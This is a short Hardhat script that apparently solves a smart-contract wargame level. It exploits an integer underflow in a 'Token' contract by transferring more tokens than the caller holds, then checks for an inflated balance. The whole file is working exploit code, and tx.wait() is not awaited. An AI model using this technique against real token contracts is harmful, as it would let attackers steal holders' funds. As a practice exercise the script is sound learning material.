import { ethers } from "hardhat";
import hre from "hardhat";

const CONTRACT_NAME = "Token";
const CONTRACT_ADDRESS = "0x230Fc2Cb70001642e669c18f42d44a7E793674F9";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //get owner address
  const [wallet] = await ethers.getSigners();
  const _to = ethers.Wallet.createRandom().address;

  const tx = await contract.transfer(_to, 21);
  tx.wait();

  const balance = await contract.balanceOf(wallet.address);
  console.log("balance: ", balance.toString());

  if (balance > ethers.BigNumber.from(20)) {
    console.log("Hack");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
